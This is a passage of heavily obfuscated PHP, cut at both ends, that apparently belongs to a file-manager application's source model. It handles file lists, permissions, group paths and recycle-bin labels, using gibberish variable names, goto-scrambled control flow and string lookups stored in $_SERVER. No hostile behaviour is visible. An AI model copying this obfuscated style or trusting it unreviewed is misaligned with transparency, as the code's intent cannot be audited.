$D•Œæ›œ¿[$DÖÍŒ­òŠ[28]] = $EºÑÂß¶É[$DÖÍŒ­òŠ[28]]; if (!isset(self::$cacheFileInfo[$DÖÍŒ­òŠ[453] . $a³ïÃ•´ˆ¦])) { self::$cacheFileInfo[$DÖÍŒ­òŠ[453] . $a³ïÃ•´ˆ¦] = array_merge(array(), $D•Œæ›œ¿); } goto bĞ»‡œ”²; cÑåùœŸç‚: if (isset($EºÑÂß¶É[$DÖÍŒ­òŠ[164]][$DÖÍŒ­òŠ[163]])) { $EºÑÂß¶É[$DÖÍŒ­òŠ[163]] = json_decode($EºÑÂß¶É[$DÖÍŒ­òŠ[164]][$DÖÍŒ­òŠ[163]], !0); unset($EºÑÂß¶É[$DÖÍŒ­òŠ[164]][$DÖÍŒ­òŠ[163]]); } goto BÂĞÀŸ±; e“Ê‡½‡³: $a³ïÃ•´ˆ¦ = $EºÑÂß¶É[$DÖÍŒ­òŠ[447]]; if (!$a³ïÃ•´ˆ¦ || !is_array($f‰¦‰‚¥Ø[$a³ïÃ•´ˆ¦])) { continue; } $D•Œæ›œ¿ = $f‰¦‰‚¥Ø[$a³ïÃ•´ˆ¦]; goto c„®ñ‰°Û; bĞ»‡œ”²: unset($f‰¦‰‚¥Ø[$a³ïÃ•´ˆ¦][$DÖÍŒ­òŠ[76]]); $Cº¾¥‹ø‚ = is_array($CËƒ†§ÏÉ[$a³ïÃ•´ˆ¦]) ? $CËƒ†§ÏÉ[$a³ïÃ•´ˆ¦] : array(); $EºÑÂß¶É[$DÖÍŒ­òŠ[164]] = array_merge($Cº¾¥‹ø‚, $f‰¦‰‚¥Ø[$a³ïÃ•´ˆ¦]); goto cÑåùœŸç‚; BÂĞÀŸ±: } unset($EºÑÂß¶É); goto bÌ¹Ÿ˜ù­â; c¡” –à¥ò: $DÖÍŒ­òŠ =& $_SERVER[ä°„ä°º]; $eÆó¶´õÊ¾ = array_to_keyvalue($BÊĞÖì†¸Î, $DÖÍŒ­òŠ[33], $DÖÍŒ­òŠ[447]); $eÆó¶´õÊ¾ = array_filter(array_unique($eÆó¶´õÊ¾)); goto Dç ’Ã“ˆò; bÌ¹Ÿ˜ù­â: } protected function _listAppendSourceInfo(&$EÛ‡·½£Ä, $A™¿¼…Çå¨) { goto d¶²œ®ÇÍ; d„ùĞ»®¥â: return $EÛ‡·½£Ä; goto aí‚Èç…; F„°Ÿ°ì†Ù: $Cï‰ÖôÚ°¿ = array_to_keyvalue_group($Eà„¶÷øò¢, $bÒÀ³²‘ï[395]); foreach ($EÛ‡·½£Ä as &$AóĞˆ”êÅÁ) { $AóĞˆ”êÅÁ[$bÒÀ³²‘ï[85]] = array($bÒÀ³²‘ï[457] => 0, $bÒÀ³²‘ï[458] => 0, $bÒÀ³²‘ï[459] => 0); if (isset($Bàò¡ƒ¬Î[$AóĞˆ”êÅÁ[$bÒÀ³²‘ï[395]]])) { $AóĞˆ”êÅÁ[$bÒÀ³²‘ï[85]][$bÒÀ³²‘ï[460]] = 1; $AóĞˆ”êÅÁ[$bÒÀ³²‘ï[85]][$bÒÀ³²‘ï[461]] = $Bàò¡ƒ¬Î[$AóĞˆ”êÅÁ[$bÒÀ³²‘ï[395]]][$bÒÀ³²‘ï[28]]; } if (isset($A÷ë‹¼¸ë˜[$AóĞˆ”êÅÁ[$bÒÀ³²‘ï[395]]])) { $AóĞˆ”êÅÁ[$bÒÀ³²‘ï[85]][$bÒÀ³²‘ï[462]] = array(); foreach ($A÷ë‹¼¸ë˜[$AóĞˆ”êÅÁ[$bÒÀ³²‘ï[395]]] as $B‰õ¦Š’À‹) { $CÃ–ù‡°‘³ = $fÃ•Á®‡Œ›[$B‰õ¦Š’À‹]; $AóĞˆ”êÅÁ[$bÒÀ³²‘ï[85]][$bÒÀ³²‘ï[462]][] = array($bÒÀ³²‘ï[463] => $CÃ–ù‡°‘³[$bÒÀ³²‘ï[393]], $bÒÀ³²‘ï[413] => $CÃ–ù‡°‘³[$bÒÀ³²‘ï[28]], $bÒÀ³²‘ï[464] => $CÃ–ù‡°‘³[$bÒÀ³²‘ï[465]]); } } if (isset($Cï‰ÖôÚ°¿[$AóĞˆ”êÅÁ[$bÒÀ³²‘ï[395]]])) { $AóĞˆ”êÅÁ[$bÒÀ³²‘ï[85]][$bÒÀ³²‘ï[466]] = array(); foreach ($Cï‰ÖôÚ°¿[$AóĞˆ”êÅÁ[$bÒÀ³²‘ï[395]]] as $EíÅ‡Ÿ–˜) { $AóĞˆ”êÅÁ[$bÒÀ³²‘ï[85]][$bÒÀ³²‘ï[466]] = array($bÒÀ³²‘ï[467] => $EíÅ‡Ÿ–˜[$bÒÀ³²‘ï[468]], $bÒÀ³²‘ï[469] => $EíÅ‡Ÿ–˜[$bÒÀ³²‘ï[470]], $bÒÀ³²‘ï[471] => $EíÅ‡Ÿ–˜[$bÒÀ³²‘ï[395]], $bÒÀ³²‘ï[472] => $EíÅ‡Ÿ–˜[$bÒÀ³²‘ï[473]], $bÒÀ³²‘ï[474] => $EíÅ‡Ÿ–˜[$bÒÀ³²‘ï[475]], $bÒÀ³²‘ï[476] => $EíÅ‡Ÿ–˜[$bÒÀ³²‘ï[476]], $bÒÀ³²‘ï[477] => $EíÅ‡Ÿ–˜[$bÒÀ³²‘ï[477]]); } } } unset($AóĞˆ”êÅÁ); goto d„ùĞ»®¥â; d¶²œ®ÇÍ: $bÒÀ³²‘ï =& $_SERVER[ä°„ä°º]; if (!defined($bÒÀ³²‘ï[454])) { return; } $Aõ¾¢Ü˜ŸÈ = Model($bÒÀ³²‘ï[455])->listData(); goto F«•½“Ùâõ; fõ÷ğÄÏåƒ: $fÃ•Á®‡Œ› = array_to_keyvalue($Aõ¾¢Ü˜ŸÈ, $bÒÀ³²‘ï[393]); $A÷ë‹¼¸ë˜ = array_to_keyvalue_group($cñç•ò§·Ç, $bÒÀ³²‘ï[76], $bÒÀ³²‘ï[419]); $Bàò¡ƒ¬Î = array_to_keyvalue($fºášğãï˜, $bÒÀ³²‘ï[76]); goto F„°Ÿ°ì†Ù; F«•½“Ùâõ: $cñç•ò§·Ç = Model($bÒÀ³²‘ï[418])->listData(); $fºášğãï˜ = Model($bÒÀ³²‘ï[408])->listData(); $Eà„¶÷øò¢ = Model($bÒÀ³²‘ï[456])->listSimple(); goto fõ÷ğÄÏåƒ; aí‚Èç…: } protected function _listAppendChildren(&$c»˜œïµ, $Bß­°–ÆÜ) { goto BóíÜºÔÈñ; BÄÈ°¥Ú©: $eç©¨ÔËÇ = array(); foreach ($AçÒÂ¡»‹Ş as $c°•ˆ…ÔĞ) { $C¦‘Æã‡ŒË = $c°•ˆ…ÔĞ[$DÌœˆÎ¿­ù[478]]; $c¥ï¤œÅÖ‰ = $c°•ˆ…ÔĞ[$DÌœˆÎ¿­ù[403]] == $DÌœˆÎ¿­ù[87] ? $DÌœˆÎ¿­ù[204] : $DÌœˆÎ¿­ù[203]; if (!isset($eç©¨ÔËÇ[$C¦‘Æã‡ŒË])) { $eç©¨ÔËÇ[$C¦‘Æã‡ŒË] = array($DÌœˆÎ¿­ù[203] => 0, $DÌœˆÎ¿­ù[204] => 0); } $eç©¨ÔËÇ[$C¦‘Æã‡ŒË][$c¥ï¤œÅÖ‰] += $c°•ˆ…ÔĞ[$DÌœˆÎ¿­ù[480]]; } foreach ($c»˜œïµ as &$bÁ§’—öƒÃ) { if (!$bÁ§’—öƒÃ[$DÌœˆÎ¿­ù[403]]) { continue; } $fÓö‹¡¿ç = is_array($eç©¨ÔËÇ[$bÁ§’—öƒÃ[$DÌœˆÎ¿­ù[395]]]) ? $eç©¨ÔËÇ[$bÁ§’—öƒÃ[$DÌœˆÎ¿­ù[395]]] : $eÊ•Ó…¥ç; $bÁ§’—öƒÃ[$DÌœˆÎ¿­ù[204]] = $fÓö‹¡¿ç[$DÌœˆÎ¿­ù[204]]; $bÁ§’—öƒÃ[$DÌœˆÎ¿­ù[203]] = $fÓö‹¡¿ç[$DÌœˆÎ¿­ù[203]]; unset($bÁ§’—öƒÃ[$DÌœˆÎ¿­ù[405]]); } goto F‹‹ÇÛñßø; BóíÜºÔÈñ: $DÌœˆÎ¿­ù =& $_SERVER[ä°„ä°º]; $d‚ÙŞŞ­ = array(); $eÊ•Ó…¥ç = array($DÌœˆÎ¿­ù[203] => 0, $DÌœˆÎ¿­ù[204] => 0); goto B÷´‰¯¹‘; F‹‹ÇÛñßø: unset($bÁ§’—öƒÃ); goto c…ÕƒãŸ³; B÷´‰¯¹‘: foreach ($c»˜œïµ as &$bÁ§’—öƒÃ) { if (!$bÁ§’—öƒÃ[$DÌœˆÎ¿­ù[403]]) { continue; } $d‚ÙŞŞ­[] = $bÁ§’—öƒÃ[$DÌœˆÎ¿­ù[395]]; } unset($bÁ§’—öƒÃ); if (!$d‚ÙŞŞ­) { return; } goto Bùµ¦óâ’†; Bùµ¦óâ’†: $Fòä¼ï±ò‹ = array($DÌœˆÎ¿­ù[478] => array($DÌœˆÎ¿­ù[7], $d‚ÙŞŞ­)); $bƒ˜ìéò…ì = array($DÌœˆÎ¿­ù[478], $DÌœˆÎ¿­ù[403], $DÌœˆÎ¿­ù[479] => $DÌœˆÎ¿­ù[480]); $AçÒÂ¡»‹Ş = $this->field($bƒ˜ìéò…ì)->where($Fòä¼ï±ò‹)->group($DÌœˆÎ¿­ù[481])->select(); goto BÄÈ°¥Ú©; c…ÕƒãŸ³: } protected function _listAppendAuth(&$a‡µÛéÄ) { goto D™Ì‰Ë‚à¿; Fàæ—¶Õ: foreach ($a‡µÛéÄ as $E…£¡µ®£) { if ($E…£¡µ®£[$FİÃ¤àÄŠ[404]] == self::TYPE_GROUP) { $eï‘°“”ÄÇ[] = $E…£¡µ®£[$FİÃ¤àÄŠ[395]]; } } if (!$eï‘°“”ÄÇ) { return; } $B¼Ä·ƒ±¯¦ = array_to_keyvalue($a‡µÛéÄ, $FİÃ¤àÄŠ[395]); goto d‚ë¾ÕÕ¾Í; D™Ì‰Ë‚à¿: $FİÃ¤àÄŠ =& $_SERVER[ä°„ä°º]; if (!defined($FİÃ¤àÄŠ[454])) { return; } $eï‘°“”ÄÇ = array(); goto Fàæ—¶Õ; d‚ë¾ÕÕ¾Í: $c²‘±™‘Ãº = Model($FİÃ¤àÄŠ[482])->getSourceList($eï‘°“”ÄÇ, $B¼Ä·ƒ±¯¦); foreach ($a‡µÛéÄ as $aÉÑø®Ã‰ => &$E…£¡µ®£) { $E…£¡µ®£[$FİÃ¤àÄŠ[406]] = $c²‘±™‘Ãº[$E…£¡µ®£[$FİÃ¤àÄŠ[395]]]; if (!$E…£¡µ®£[$FİÃ¤àÄŠ[406]] && $E…£¡µ®£[$FİÃ¤àÄŠ[404]] == self::TYPE_GROUP) { $E…£¡µ®£[$FİÃ¤àÄŠ[406]] = Action($FİÃ¤àÄŠ[483])->pathGroupAuthMake($E…£¡µ®£[$FİÃ¤àÄŠ[484]]); if (!$E…£¡µ®£[$FİÃ¤àÄŠ[406]] && !_get($GLOBALS, $FİÃ¤àÄŠ[485])) { $E…£¡µ®£[$FİÃ¤àÄŠ[196]] = !1; $E…£¡µ®£[$FİÃ¤àÄŠ[195]] = !1; } } if ($E…£¡µ®£[$FİÃ¤àÄŠ[406]]) { $E…£¡µ®£[$FİÃ¤àÄŠ[196]] = AuthModel::authCheckEdit($E…£¡µ®£[$FİÃ¤àÄŠ[406]][$FİÃ¤àÄŠ[407]]); $E…£¡µ®£[$FİÃ¤àÄŠ[195]] = AuthModel::authCheckView($E…£¡µ®£[$FİÃ¤àÄŠ[406]][$FİÃ¤àÄŠ[407]]); } $this->groupPathDisplay($E…£¡µ®£); } unset($E…£¡µ®£); goto B†—è†ê; B†—è†ê: } public function _listAppendAuthSecret(&$C´Îê•……Ş) { goto DØº¾ìâî²; DØº¾ìâî²: $Eœ«‘ñŸÕ =& $_SERVER[ä°„ä°º]; if (Model($Eœ«‘ñŸÕ[486])->get($Eœ«‘ñŸÕ[487]) != $Eœ«‘ñŸÕ[87]) { return; } static $d«…Ö—ÕÁÆ = false; goto aà™›¿á; DÓÍÎ„±¤¹: $b‹Úˆ·Ä™Ÿ = $this->_listAppendPath($e„¯ìĞ¶÷, !0); foreach ($C´Îê•……Ş as $F¯òÌ×¶Ã½ => &$aÍ””ö²) { if (!is_array($aÍ””ö²[$Eœ«‘ñŸÕ[406]])) { continue; } if ($aÍ””ö²[$Eœ«‘ñŸÕ[404]] != $Eœ«‘ñŸÕ[496]) { continue; } if (isset($d«…Ö—ÕÁÆ[$aÍ””ö²[$Eœ«‘ñŸÕ[395]]])) { goto F”²‡Éôñ; F”²‡Éôñ: $fÜÄë·ÜÏ = $d«…Ö—ÕÁÆ[$aÍ””ö²[$Eœ«‘ñŸÕ[395]]]; if (!is_array($aÍ””ö²[$Eœ«‘ñŸÕ[445]])) { $aÍ””ö²[$Eœ«‘ñŸÕ[445]] = array(); } $aÍ””ö²[$Eœ«‘ñŸÕ[445]][$Eœ«‘ñŸÕ[497]] = $fÜÄë·ÜÏ[$Eœ«‘ñŸÕ[491]]; goto AªõÀ¶Ô ; AªõÀ¶Ô : $aÍ””ö²[$Eœ«‘ñŸÕ[406]][$Eœ«‘ñŸÕ[498]] = $fÜÄë·ÜÏ; $aÍ””ö²[$Eœ«‘ñŸÕ[406]][$Eœ«‘ñŸÕ[499]] = $aÍ””ö²[$Eœ«‘ñŸÕ[500]]; $aÍ””ö²[$Eœ«‘ñŸÕ[406]][$Eœ«‘ñŸÕ[501]] = $Eœ«‘ñŸÕ[87]; goto C•î«öá¶•; C•î«öá¶•: if ($fÜÄë·ÜÏ[$Eœ«‘ñŸÕ[432]] != $F´±÷†Î½) { $aÍ””ö²[$Eœ«‘ñŸÕ[406]][$Eœ«‘ñŸÕ[407]] = $aÍ””ö²[$Eœ«‘ñŸÕ[406]][$Eœ«‘ñŸÕ[407]] & $fÜÄë·ÜÏ[$Eœ«‘ñŸÕ[406]][$Eœ«‘ñŸÕ[406]]; } continue; goto cÍ¦Óàà˜ï; cÍ¦Óàà˜ï: } $D‚‘êìËâ— = $this->parentLevelArray($aÍ””ö²[$Eœ«‘ñŸÕ[502]]); $BíêĞ‹»¡Ô = array_reverse($D‚‘êìËâ—); foreach ($BíêĞ‹»¡Ô as $E…†Œİé” => $cğ¬óôŸ†İ) { goto Eà»¯¬¨”À; Eà»¯¬¨”À: if (!isset($d«…Ö—ÕÁÆ[$cğ¬óôŸ†İ])) { continue; } $fÜÄë·ÜÏ = $d«…Ö—ÕÁÆ[$cğ¬óôŸ†İ]; $aÍ””ö²[$Eœ«‘ñŸÕ[406]][$Eœ«‘ñŸÕ[498]] = $fÜÄë·ÜÏ; goto cëˆù£–…ô; cëˆù£–…ô: if ($fÜÄë·ÜÏ[$Eœ«‘ñŸÕ[432]] != $F´±÷†Î½) { $aÍ””ö²[$Eœ«‘ñŸÕ[406]][$Eœ«‘ñŸÕ[407]] = $aÍ””ö²[$Eœ«‘ñŸÕ[406]][$Eœ«‘ñŸÕ[407]] & $fÜÄë·ÜÏ[$Eœ«‘ñŸÕ[406]][$Eœ«‘ñŸÕ[406]]; } $d¸æ¾‰‘‚ = $Eœ«‘ñŸÕ[33]; $BµßÀƒ‹Öè = count($D‚‘êìËâ—) - $E…†Œİé”; goto e¢Ñß´Á´; e¢Ñß´Á´: for ($e¦ÒïªÍÀ— = 0; $e¦ÒïªÍÀ— < $BµßÀƒ‹Öè; $e¦ÒïªÍÀ—++) { if (!isset($b‹Úˆ·Ä™Ÿ[$D‚‘êìËâ—[$e¦ÒïªÍÀ—]])) { $d¸æ¾‰‘‚ = $Eœ«‘ñŸÕ[33]; break; } $d¸æ¾‰‘‚ = $d¸æ¾‰‘‚ . rtrim($b‹Úˆ·Ä™Ÿ[$D‚‘êìËâ—[$e¦ÒïªÍÀ—]], $Eœ«‘ñŸÕ[8]) . $Eœ«‘ñŸÕ[8]; } $aÍ””ö²[$Eœ«‘ñŸÕ[406]][$Eœ«‘ñŸÕ[499]] = rtrim($d¸æ¾‰‘‚, $Eœ«‘ñŸÕ[8]) . $Eœ«‘ñŸÕ[8]; break; goto B½êØ‹¾Ä; B½êØ‹¾Ä: } } unset($aÍ””ö²); goto A±Ê‘ÌšÅÃ; aà™›¿á: if (!$d«…Ö—ÕÁÆ) { goto FƒŒ’§„‚¯; BÚˆ¼Â”¥: foreach ($d«…Ö—ÕÁÆ as $F¯òÌ×¶Ã½ => $aÍ””ö²) { goto A¹ÂÈİÓ‡è; A¹ÂÈİÓ‡è: $añÖàí¨õ = $FÖ¢›¼®æÍ[$aÍ””ö²[$Eœ«‘ñŸÕ[491]]]; if (!$añÖàí¨õ) { $E§´ÙŞó÷»->remove($aÍ””ö²[$Eœ«‘ñŸÕ[393]]); unset($d«…Ö—ÕÁÆ[$F¯òÌ×¶Ã½]); continue; } $f‡Æ›‹„ÔÆ = $bãƒÍå¹â->listData($añÖàí¨õ[$Eœ«‘ñŸÕ[406]]); goto eÊ‡å¹Á¾ö; eÊ‡å¹Á¾ö: if (!$f‡Æ›‹„ÔÆ) { $E§´ÙŞó÷»->remove($aÍ””ö²[$Eœ«‘ñŸÕ[393]]); unset($d«…Ö—ÕÁÆ[$F¯òÌ×¶Ã½]); continue; } $aÍ””ö²[$Eœ«‘ñŸÕ[406]] = $f‡Æ›‹„ÔÆ; $aÍ””ö²[$Eœ«‘ñŸÕ[492]] = $añÖàí¨õ; goto d¨œ¨Š®¤˜; d¨œ¨Š®¤˜: $aÍ””ö²[$Eœ«‘ñŸÕ[493]] = Model($Eœ«‘ñŸÕ[494])->getInfoSimpleOuter($aÍ””ö²[$Eœ«‘ñŸÕ[432]]); $d«…Ö—ÕÁÆ[$F¯òÌ×¶Ã½] = $aÍ””ö²; goto c’Ê¬ÊÙˆ‰; c’Ê¬ÊÙˆ‰: } goto d§ºª„âè; FƒŒ’§„‚¯: $bãƒÍå¹â = Model($Eœ«‘ñŸÕ[488]); $E§´ÙŞó÷» = Model($Eœ«‘ñŸÕ[489]); $d«…Ö—ÕÁÆ = $E§´ÙŞó÷»->listData(); goto dàà½“Üå; dàà½“Üå: $d«…Ö—ÕÁÆ = array_to_keyvalue($d«…Ö—ÕÁÆ, $Eœ«‘ñŸÕ[395]); $FÖ¢›¼®æÍ = json_decode(Model($Eœ«‘ñŸÕ[486])->get($Eœ«‘ñŸÕ[490]), !0); $FÖ¢›¼®æÍ = array_to_keyvalue($FÖ¢›¼®æÍ, $Eœ«‘ñŸÕ[393]); goto BÚˆ¼Â”¥; d§ºª„âè: } $F´±÷†Î½ = defined($Eœ«‘ñŸÕ[495]) ? USER_ID : $Eœ«‘ñŸÕ[33]; $e„¯ìĞ¶÷ = array(); goto DÓÍÎ„±¤¹; A±Ê‘ÌšÅÃ: } public function groupPathDisplay(&$dˆÁ×µ”ãÆ) { goto fã ²¸˜ŸÄ; cŒøÀöêğ: $dˆÁ×µ”ãÆ[$f¶ÑÑ­àò[504]] = $b¸ÏÈîë…[$f¶ÑÑ­àò[478]]; $dˆÁ×µ”ãÆ[$f¶ÑÑ­àò[505]] = $b¸ÏÈîë…[$f¶ÑÑ­àò[502]]; $dˆÁ×µ”ãÆ[$f¶ÑÑ­àò[506]] = $b¸ÏÈîë…[$f¶ÑÑ­àò[507]]; goto fñìËìÑ¦; fñìËìÑ¦: $dˆÁ×µ”ãÆ[$f¶ÑÑ­àò[508]] = $a¬‰ğŠô¼Ì . $b¸ÏÈîë…[$f¶ÑÑ­àò[85]][$f¶ÑÑ­àò[395]]; goto bê¿©‚ÖÆÚ; fã ²¸˜ŸÄ: $f¶ÑÑ­àò =& $_SERVER[ä°„ä°º]; if ($dˆÁ×µ”ãÆ[$f¶ÑÑ­àò[404]] != self::TYPE_GROUP) { return; } $b¸ÏÈîë… = Model($f¶ÑÑ­àò[503])->getInfo($dˆÁ×µ”ãÆ[$f¶ÑÑ­àò[484]]); goto B¾™ Í¤‡Œ; B¾™ Í¤‡Œ: $CŒ‘¦™åÖÀ = $this->parentLevelArray($b¸ÏÈîë…[$f¶ÑÑ­àò[502]]); $a¬‰ğŠô¼Ì = $f¶ÑÑ­àò[33]; foreach ($CŒ‘¦™åÖÀ as $A‹¹£°õ©Ù) { $eâØíª™ä = Model($f¶ÑÑ­àò[503])->getInfo($A‹¹£°õ©Ù); $a¬‰ğŠô¼Ì .= $eâØíª™ä[$f¶ÑÑ­àò[85]][$f¶ÑÑ­àò[395]] . $f¶ÑÑ­àò[47]; } goto cŒøÀöêğ; bê¿©‚ÖÆÚ: } protected function _listAppendPath(&$B¢ª¥‹÷ğš, $b¡íïåÈŠ = false) { goto B‡«­Úšæ¥; Aßî Çã†­: unset($A¿É ƒ–È); return $B¢ª¥‹÷ğš; goto e…Èäê¡­; B‡«­Úšæ¥: $E²§¥Õ‡é =& $_SERVER[ä°„ä°º]; static $aŠ³ì°ƒÆˆ = array(); $FÂÕäœÏê­ = array(); goto d¡³¤ÒôÉ‡; BÍğ‰Û–: $DÍ¦Ñ×Â©Î = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $D°®®ˆáïÒ = array(); foreach ($B¢ª¥‹÷ğš as &$A¿É ƒ–È) { goto EâÅƒÖíå…; C‡¦á×èÑÈ: $AÜĞ™ŒÌÒ° .= $A¿É ƒ–È[$E²§¥Õ‡é[28]]; if ($A¿É ƒ–È[$E²§¥Õ‡é[403]] == $E²§¥Õ‡é[87]) { $AÜĞ™ŒÌÒ° .= $E²§¥Õ‡é[8]; } $A¿É ƒ–È[$E²§¥Õ‡é[500]] = str_replace($E²§¥Õ‡é[510], $E²§¥Õ‡é[8], $AÜĞ™ŒÌÒ°); goto fà—ˆµÙœ; fà—ˆµÙœ: if ($A¿É ƒ–È[$E²§¥Õ‡é[478]] == $E²§¥Õ‡é[191]) { $A¿É ƒ–È[$E²§¥Õ‡é[28]] = trim($aŠ³ì°ƒÆˆ[$A¿É ƒ–È[$E²§¥Õ‡é[395]]], $E²§¥Õ‡é[8]); } if (intval($A¿É ƒ–È[$E²§¥Õ‡é[404]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($A¿É ƒ–È, $Fï†ÃçƒáŠ, $DÍ¦Ñ×Â©Î); } goto f¦Ñœ§«¬µ; EâÅƒÖíå…: $D ÇóÙ§ = $A¿É ƒ–È[$E²§¥Õ‡é[502]]; $AÜĞ™ŒÌÒ° = $E²§¥Õ‡é[33]; if (isset($D°®®ˆáïÒ[$D ÇóÙ§])) { $AÜĞ™ŒÌÒ° = $D°®®ˆáïÒ[$D ÇóÙ§]; } else { $Fï†ÃçƒáŠ = $this->parentLevelArray($A¿É ƒ–È[$E²§¥Õ‡é[502]]); foreach ($Fï†ÃçƒáŠ as $Aù˜ÇËÜä => $a°õ³ˆÖ¶Æ) { if (isset($aŠ³ì°ƒÆˆ[$a°õ³ˆÖ¶Æ])) { $AÜĞ™ŒÌÒ° .= $aŠ³ì°ƒÆˆ[$a°õ³ˆÖ¶Æ] . $E²§¥Õ‡é[8]; } } $D°®®ˆáïÒ[$D ÇóÙ§] = $AÜĞ™ŒÌÒ°; } goto C‡¦á×èÑÈ; f¦Ñœ§«¬µ: } goto Aßî Çã†­; FŒÃªŒó™„: unset($A¿É ƒ–È); $FÂÕäœÏê­ = array_unique($FÂÕäœÏê­); if (count($FÂÕäœÏê­) > 0) { $BŒ‰òŞÉàê = array($E²§¥Õ‡é[410] => array($E²§¥Õ‡é[411], $FÂÕäœÏê­)); if (count($FÂÕäœÏê­) == 1) { $e¢Ï¡çÊÌ» = $this->sourceInfo($FÂÕäœÏê­[0]); $fÄ‹ŠùùÂÅ = is_array($e¢Ï¡çÊÌ») ? array($e¢Ï¡çÊÌ») : !1; } else { $fÄ‹ŠùùÂÅ = $this->field($E²§¥Õ‡é[509])->where($BŒ‰òŞÉàê)->select(); } if (!$fÄ‹ŠùùÂÅ) { $fÄ‹ŠùùÂÅ = array(); } foreach ($fÄ‹ŠùùÂÅ as $A‘Á¦‹ö†) { $aŠ³ì°ƒÆˆ[$A‘Á¦‹ö†[$E²§¥Õ‡é[395]]] = $A‘Á¦‹ö†[$E²§¥Õ‡é[28]]; } } goto BÍğ‰Û–; d¡³¤ÒôÉ‡: $E…®ÁĞÇÑ¼ = array(); if ($b¡íïåÈŠ) { return $aŠ³ì°ƒÆˆ; } foreach ($B¢ª¥‹÷ğš as &$A¿É ƒ–È) { goto BÜãÈõ±Ş; e«¥ÜÂ™Š: if (isset($E…®ÁĞÇÑ¼[$A¿É ƒ–È[$E²§¥Õ‡é[502]]])) { continue; } $E…®ÁĞÇÑ¼[$A¿É ƒ–È[$E²§¥Õ‡é[502]]] = !0; $Fï†ÃçƒáŠ = $this->parentLevelArray($A¿É ƒ–È[$E²§¥Õ‡é[502]]); goto AõÅ­ˆÙ; BÜãÈõ±Ş: $Fß‰Ğä±Îê = $A¿É ƒ–È[$E²§¥Õ‡é[395]]; if ($A¿É ƒ–È[$E²§¥Õ‡é[403]] == $E²§¥Õ‡é[87] && $A¿É ƒ–È[$E²§¥Õ‡é[478]] != 0) { $aŠ³ì°ƒÆˆ[$Fß‰Ğä±Îê] = $A¿É ƒ–È[$E²§¥Õ‡é[28]]; } if ($A¿É ƒ–È[$E²§¥Õ‡é[403]] == $E²§¥Õ‡é[87] && $A¿É ƒ–È[$E²§¥Õ‡é[478]] == 0 && !isset($aŠ³ì°ƒÆˆ[$Fß‰Ğä±Îê])) { $aŠ³ì°ƒÆˆ[$Fß‰Ğä±Îê] = $this->_listAppendPathRoot($A¿É ƒ–È, array()); } goto e«¥ÜÂ™Š; AõÅ­ˆÙ: foreach ($Fï†ÃçƒáŠ as $Aù˜ÇËÜä => $a°õ³ˆÖ¶Æ) { if (isset($aŠ³ì°ƒÆˆ[$a°õ³ˆÖ¶Æ])) { continue; } if ($Aù˜ÇËÜä == 0) { $aŠ³ì°ƒÆˆ[$a°õ³ˆÖ¶Æ] = $this->_listAppendPathRoot($A¿É ƒ–È, $Fï†ÃçƒáŠ); } if ($Aù˜ÇËÜä != 0) { $FÂÕäœÏê­[] = $a°õ³ˆÖ¶Æ; } } goto E¯†¿“„ç‘; E¯†¿“„ç‘: } goto FŒÃªŒó™„; e…Èäê¡­: } private function _listAppendPathRecycle(&$a¥ì—Û·Ú·, $bóÜÉÃÙÅ‡, $FêÆ™“ñ©Û) { goto b‚‘Èïí‘†; DÊ©Õ³âá: if ($a¥ì—Û·Ú·[$BÈ«‹Ò‘ó±[395]] == $FêÆ™“ñ©Û) { $a¥ì—Û·Ú·[$BÈ«‹Ò‘ó±[502]] = $BÈ«‹Ò‘ó±[512]; $a¥ì—Û·Ú·[$BÈ«‹Ò‘ó±[478]] = $BÈ«‹Ò‘ó±[191]; $a¥ì—Û·Ú·[$BÈ«‹Ò‘ó±[28]] = LNG($BÈ«‹Ò‘ó±[511]); } $a¥ì—Û·Ú·[$BÈ«‹Ò‘ó±[513]] = $BÈ«‹Ò‘ó±[514]; goto E“Õ¹¾“Ç; b‚‘Èïí‘†: $BÈ«‹Ò‘ó± =& $_SERVER[ä°„ä°º]; if (!in_array($FêÆ™“ñ©Û, $bóÜÉÃÙÅ‡) && $a¥ì—Û·Ú·[$BÈ«‹Ò‘ó±[395]] != $FêÆ™“ñ©Û) { return; } $F„ÜËÒ£Ê = explode($BÈ«‹Ò‘ó±[8], trim($a¥ì—Û·Ú·[$BÈ«‹Ò‘ó±[500]], $BÈ«‹Ò‘ó±[8])); goto CÃ‘ÛÒÓŒÔ; CÃ‘ÛÒÓŒÔ: $dóèˆ‹…“Ú = implode($BÈ«‹Ò‘ó±[8], array_slice($F„ÜËÒ£Ê, 2)); $a¥ì—Û·Ú·[$BÈ«‹Ò‘ó±[500]] = $BÈ«‹Ò‘ó±[8] . LNG($BÈ«‹Ò‘ó±[511]) . $BÈ«‹Ò‘ó±[8] . ltrim($dóèˆ‹…“Ú, $BÈ«‹Ò‘ó±[8]); $a¥ì—Û·Ú·[$BÈ«‹Ò‘ó±[502]] = $BÈ«‹Ò‘ó±[512] . implode($BÈ«‹Ò‘ó±[47], array_slice($bóÜÉÃÙÅ‡, 1)) . $BÈ«‹Ò‘ó±[47]; goto DÊ©Õ³âá; E“Õ¹¾“Ç: } protected function _listAppendPathRoot(&$a†óğïÖë, $dè£øÊê‡) { $fÖªº¸·çŞ =& $_SERVER[ä°„ä°º]; $e¸·Á–èîÅ = $fÖªº¸·çŞ[33]; if ($a†óğïÖë[$fÖªº¸·çŞ[404]] == self::TYPE_USER) { if (defined($fÖªº¸·çŞ[454]) && $a†óğïÖë[$fÖªº¸·çŞ[484]] == USER_ID) { $e¸·Á–èîÅ = LNG($fÖªº¸·çŞ[515]); if (!$dè£øÊê‡) { $a†óğïÖë[$fÖªº¸·çŞ[28]] = $e¸·Á–èîÅ; } } else { $c•ââ«ÓùÑ = Model($fÖªº¸·çŞ[494])->getInfoSimple($a†óğïÖë[$fÖªº¸·çŞ[484]]); $e¸·Á–èîÅ = LNG($fÖªº¸·çŞ[516]) . $fÖªº¸·çŞ[160] . $c•ââ«ÓùÑ[$fÖªº¸·çŞ[28]] . $fÖªº¸·çŞ[517]; } } else { if ($a†óğïÖë[$fÖªº¸·çŞ[404]] == self::TYPE_GROUP) { $c•ââ«ÓùÑ = Model($fÖªº¸·çŞ[503])->getInfoSimple($a†óğïÖë[$fÖªº¸·çŞ[484]]); $e¸·Á–èîÅ = $c•ââ«ÓùÑ[$fÖªº¸·çŞ[28]]; } else { if ($a†óğïÖë[$fÖªº¸·çŞ[404]] == self::TYPE_SYSTEM) { $e¸·Á–èîÅ = $fÖªº¸·çŞ[518]; } } } $e¸·Á–èîÅ = $e¸·Á–èîÅ ? 